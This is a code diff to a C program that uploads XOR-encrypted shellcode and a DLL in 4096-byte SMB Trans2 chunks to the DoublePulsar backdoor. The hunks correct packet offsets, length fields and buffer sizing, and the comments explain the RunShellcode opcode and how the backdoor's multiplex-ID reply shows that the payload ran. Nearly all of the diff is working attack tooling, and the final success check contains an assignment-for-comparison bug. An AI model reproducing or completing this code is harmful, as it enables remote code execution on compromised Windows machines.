@@ -724,11 +724,12 @@ int main(int argc, char* argv[])
 	xor_payload(XorKey, payload.lpbData, len);
 
 	//build packet buffer with 4178 bytes in length
-	//82 bytes for the Trans2 Session Setup packet header
+	//70 bytes for the Trans2 Session Setup packet header
+	//12 bytes for the SESSION_SETUP parameters
 	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
 	//Then fill the packet with 0x00s and XOR it with the calculated key
 	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
-	memset(big_packet, 0x00, 4178);
+	memset(big_packet, 0x00, 4178+1);
 
 	//Copy Trans2 Information
 	//Update the values (TreeID, UserID, Multiplex, ProcessID) for the SMB packet
@@ -748,70 +749,93 @@ int main(int argc, char* argv[])
 	{
 		if (bytesLeft < 4096)
 		{
+			printf("Bytes left is less than 4096!...This will be the last & smaller packet!\n");
+			
 			//copy trans2 header to big packet
 			memcpy(big_packet, trans2_request, sizeof(trans2_request));
 
-			//update TreeId, UserID, ProcessID & MultiplexID in packet
+			//update TreeId, UserID & ProcessID in packet
 			memcpy(big_packet + 28, (char*)&treeid, 2);
 			memcpy(big_packet + 30, (char*)&processid, 2);
 			memcpy(big_packet + 32, (char*)&userid, 2);
-			big_packet[34] = '\x41';
+			
+			//no need to update this to 42 because the packet is already set to 42
+			//if the command succeeds, DoublePulsar will increment by 10
+			//and return with x52 or 82
+			//big_packet[34] = '\x42';
 
 			//update Timeout for RunShellcode
 			//25 89 1a 00 is the opcode for RunShellcode & DLL
+			
+			//NOT NEEDED since this is already in the wannacry exec packet
+			/*
 			big_packet[49] = '\x25';
 			big_packet[50] = '\x89';
 			big_packet[51] = '\x1a';
 			big_packet[52] = '\x00';
+			*/
 			
 			//since this packet is smaller than the rest
-			//Generate new memory location with the size of: bytesLeft+32+34+12
+			//Update the SMB length to the size of: bytesLeft+70+12
 			//the total SMB length has to be changed because this packet is smaller than the rest
-			smblen = bytesLeft+32+34+12; //BytesLeft + SMB header + Trans2 header + Trans2_SESSION_DATA parameter
+			smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
 			memcpy(big_packet+3, &smblen, 1);
 			
-			printf("Bytes left is less than 4096!...Generating smaller packet!\n");
-			memcpy(big_packet +  sizeof(trans2_request), (unsigned char*)encrypted + ctx, bytesLeft);
-			//send(s, (char*)Trans2SESSION, 4178, 0);
-			//send(s, &buf, 4178, 0);
-			send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
+			//FIX HERE but copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
+			memcpy(big_packet + 70, SESSION_SETUP_PARAMETERS, 12);
+			
+			printf("Bytes left is less than 4096!...This will be the last & smaller packet!\n");
+			memcpy(big_packet + 70 + 12, (unsigned char*)encrypted + ctx, bytesLeft);
+
+			send(sock, (char*)big_packet, smblen, 0);
 			recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+			
+			//DoublePulsar response: STATUS_NOT_IMPLEMENTED
 			if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 			{
 				printf("All data sent and got good response from DoublePulsar!\n");
 			}
-			break;
+			goto multiplexcheck;
 		}
+		
+		
+		//copy the trans2 request to big_packet
 		memcpy(big_packet, trans2_request, sizeof(trans2_request));
 
-		//update TreeId, UserID, ProcessID & MultiplexID in packet
+		//update TreeId, UserID & ProcessID in packet
 		memcpy(big_packet + 28, (char*)&treeid, 2);
 		memcpy(big_packet + 30, (char*)&processid, 2);
 		memcpy(big_packet + 32, (char*)&userid, 2);
 		//memcpy(big_packet + 34, (char*)&multiplexid, 2);
-		//update multiplex id to 41
+		
+		//NO need to update, this is already in the packet
+		//kept for historical purposes
+		//update multiplex id to 42
 		//if doublepulsar is successful, it will increment by 10
-		//if x51 is returned then success it ran!
-		big_packet[34] = '\x41';
+		//if the DoublePulsar response is x52...then success! it ran!
+		//big_packet[34] = '\x42';
 
+		//Packet already contains this, no need to update the Timeout signature
+		//kept for historical purposes
 		//update Timeout for RunShellcode
 		//25 89 1a 00 is the opcode for RunShellcode & DLL
-		big_packet[49] = '\x25';
-		big_packet[50] = '\x89';
-		big_packet[51] = '\x1a';
-		big_packet[52] = '\x00';
+		//big_packet[49] = '\x25';
+		//big_packet[50] = '\x89';
+		//big_packet[51] = '\x1a';
+		//big_packet[52] = '\x00';
 		
-		//fix me
+		//copy the SESSION_SETUP parameters
+		memcpy(big_packet +  70, (char*)SESSION_SETUP_PARAMETERS, 12);
+		
 		//copy 4096 bytes at a time from the XOR encrypted buffer
-		memcpy(big_packet +  sizeof(trans2_request), (char*)encrypted+ctx, 4096);
+		memcpy(big_packet +  70 + 12, (char*)encrypted+ctx, 4096);
 
-		//FIX ME
-		//fix data len values
+		//FIX ME!  Fix the data len values
 		//Trans2.Session_Data_Length = sizeof(encrypted);
 		
 		//FIX ME
 		//fix SMB data length in SMB header
-		smblen = 4096+32+34+12; //4096 + SMB header + Trans2 header + Trans2_SESSION_DATA parameter
+		smblen = 4096+70+12; //4096 + EXEC Packet + Trans2_SESSION_DATA parameter
 		memcpy(big_packet+3, &smblen, 1);
 
 		//send the payload(shellcode + dll) in chunk of 0x1000(4096) bytes to backdoor.
@@ -834,6 +858,7 @@ int main(int argc, char* argv[])
 		ctx += 4096;
 	}
 
+multiplexcheck:
 	//command received successfully!
 	if (recvbuff[34] = 0x52)
 	{
